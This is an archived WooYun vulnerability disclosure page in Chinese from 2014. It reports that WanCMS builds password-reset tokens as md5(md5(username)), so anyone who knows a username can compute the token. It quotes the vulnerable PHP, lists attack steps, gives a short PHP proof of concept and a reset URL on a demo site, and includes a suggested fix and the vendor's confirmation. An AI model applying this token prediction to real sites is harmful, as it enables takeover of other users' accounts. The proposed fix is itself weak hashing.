@@ -1,0 +1,246 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		WanCMS 可修改任意用户密码（源码详析+实例演示）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		WanCMS 可修改任意用户密码（源码详析+实例演示）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxj616">lxj616</a> 
+</li><li>提交时间：		2014-01-19 16:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-23：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-09：	细节向普通白帽子公开<br/>
+									2014-03-01：	细节向实习白帽子公开<br/>
+									2014-04-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">WanCMS 可修改任意用户密码（源码详析+实例演示）<br />
+在官方演示站demo.wancms.com做实例测试<br />
+（未测试旧版本，据原理分析可能是全版本通杀，本测试使用的版本是站长之家20130102的1.3免费版，官网不明版本演示测试成功）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/app/Lib/Action/AccountsAction.class.php     line:580<br />
+<br />
+</p><pre><code>//密码找回相关代码<br />
+		if ($_POST [&#039;submit&#039;]) {<br />
+			$email = trim ( $_POST [&#039;t&#039;] );<br />
+			$username = trim ( $_POST [&#039;username&#039;] );<br />
+			$public = A ( &#039;Public&#039; );<br />
+//注意下面这句<br />
+			$reurl = $config [&#039;DOMAIN&#039;] . &#039;/accounts/forget_password_t?vc=&#039; . md5 ( md5 ( $username ) );<br />
+//MD5是hash函数，而非加密函数，当用户得知username后可轻易推断md5散列值，因此，密码找回验证完全被绕过<br />
+//与以下无关<br />
+			$subject = &quot;用户邮箱找回密码&#039;&quot;;<br />
+			$body = &quot;尊敬的网页游戏用户您好：<br />
+请点击以下地址找回您的密码,&quot; . $reurl . &quot;<br />
+祝您游戏愉快！有任何问题可到我们官方网站联系&quot;;<br />
+			if ($public-&gt;think_send_mail ( $email, &#039;平台系统信息&#039;, $subject, $body )) {<br />
+				$arr_i [&#039;user_status&#039;] = 1;   //所以要先申请找回<br />
+				$arr_i [&#039;pwd_flag&#039;] = md5 ( md5 ( $username ) );<br />
+				$member-&gt;where ( &quot;username =&#039;&quot; . $username . &quot;&#039;&quot; )-&gt;save ( $arr_i ); // 更新状态<br />
+				$this-&gt;success ( &#039;已发送到您的邮箱，请去邮箱完成验证&#039;, &#039;/&#039; );<br />
+			} else {<br />
+				$this-&gt;error ( &#039;发送失败 ，请联系客服&#039;, &#039;/&#039; );<br />
+			}<br />
+		}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+所以，<br />
+<br />
+1.点击找回密码<br />
+<br />
+2.发送验证邮件<br />
+<br />
+3.计算md5 ( md5 ( $username ) )<br />
+<br />
+4.重置密码<br />
+<br />
+<br />
+<br />
+poc：<br />
+<br />
+</p><pre><code>&lt;?php <br />
+$username=&#039;lxj616&#039;;<br />
+$t=md5 ( md5 ( $username ) );<br />
+echo $t;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>http://demo.31wan.cn/accounts/forget_password_t?vc=c1bfd25357a080c23ac5297c8ce6e7d6</code></pre><p class='detail'><br />
+<br />
+注：验证时别忘了先点击“发送验证邮件”<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19092755e11ab7b7e1b1c4354cc640d98e99e0d8.png" target="_blank"><img src="../images/19092755e11ab7b7e1b1c4354cc640d98e99e0d8.png" alt="QQ截图20140119092522.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以计算一下poc生成 c1bfd25357a080c23ac5297c8ce6e7d6<br />
+<br />
+<br />
+<br />
+漏洞成因总结为：身份令牌可预测 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/19092755e11ab7b7e1b1c4354cc640d98e99e0d8.png" target="_blank"><img src="../images/19092755e11ab7b7e1b1c4354cc640d98e99e0d8.png" alt="QQ截图20140119092522.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">$reurl = $config [&#039;DOMAIN&#039;] . &#039;/accounts/forget_password_t?vc=&#039; . md5 ( md5 ( $username ) );<br />
+<br />
+<br />
+<br />
+改为：<br />
+<br />
+<br />
+<br />
+$reurl = $config [&#039;DOMAIN&#039;] . &#039;/accounts/forget_password_t?vc=&#039; . md5 ( md5 ( $username.$password ) );<br />
+<br />
+<br />
+<br />
+前后文按照此方法修改即可，由于攻击者无法预先获知password和random，因此无法再伪造找回密码链接 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxj616" title="lxj616">lxj616</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049284" title="WanCMS 可修改任意用户密码（源码详析+实例演示）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-01-20 14:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49284";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
